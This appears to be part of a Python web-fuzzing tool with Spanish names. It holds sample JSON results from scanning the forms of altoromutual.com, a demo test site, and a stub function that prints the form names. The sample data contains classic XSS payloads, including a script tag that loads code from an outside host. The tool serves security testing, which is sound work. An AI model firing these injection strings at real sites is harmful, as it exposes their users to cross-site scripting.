"""
    json_recibido = {
        "sitio": "altoromutual.com:8080",
        "paginas": [
            {
            "sitio": "http://altoromutual.com:8080/login.jsp",
            "forms": {
                    "frmSearch": [
                        {
                            "inputs": "query:# credit to rsnake ",
                            "xss": False,
                            "sqli": False,
                            "lfi": False
                        },
                        {
                            "inputs": "query:<SCRIPT>alert('XSS');</SCRIPT> ",
                            "xss": True,
                            "sqli": False,
                            "lfi": False
                        },
                        {
                            "inputs": "query:'';!--\"<XSS>=&{()} ",
                            "xss": False,
                            "sqli": False,
                            "lfi": False
                        },
                        {
                            "inputs": "query:<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT> ",
                            "xss": True,
                            "sqli": False,
                            "lfi": False
                        },
                    ],
                    "login": [
                        {
                            "inputs": "query:# credit to rsnake ",
                            "xss": False,
                            "sqli": False,
                            "lfi": False
                        },
                        {
                            "inputs": "query:<SCRIPT>alert('XSS');</SCRIPT> ",
                            "xss": True,
                            "sqli": False,
                            "lfi": False
                        },
                        {
                            "inputs": "query:'';!--\"<XSS>=&{()} ",
                            "xss": False,
                            "sqli": False,
                            "lfi": False
                        },
                        {
                            "inputs": "query:<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT> ",
                            "xss": True,
                            "sqli": False,
                            "lfi": False
                        },
                    ]
                }
            },
            {
            "sitio": "http://altoromutual.com:8080/search.jsp",
            "forms": {
                    "frmSearch": [
                        {
                            "inputs": "query:# credit to rsnake ",
                            "xss": False,
                            "sqli": False,
                            "lfi": False
                        },
                        {
                            "inputs": "query:<SCRIPT>alert('XSS');</SCRIPT> ",
                            "xss": True,
                            "sqli": False,
                            "lfi": False
                        },
                        {
                            "inputs": "query:'';!--\"<XSS>=&{()} ",
                            "xss": False,
                            "sqli": False,
                            "lfi": False
                        },
                        {
                            "inputs": "query:<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT> ",
                            "xss": True,
                            "sqli": False,
                            "lfi": False
                        },
                    ]
                }
            }
        ]
    }
"""

def fuzzing_obtener_estaditisticas(json_recibido):
    for posicion_pagina in range(len(json_recibido["paginas"])):
        for form in json_recibido["paginas"][posicion_pagina]["forms"]:
            print(form)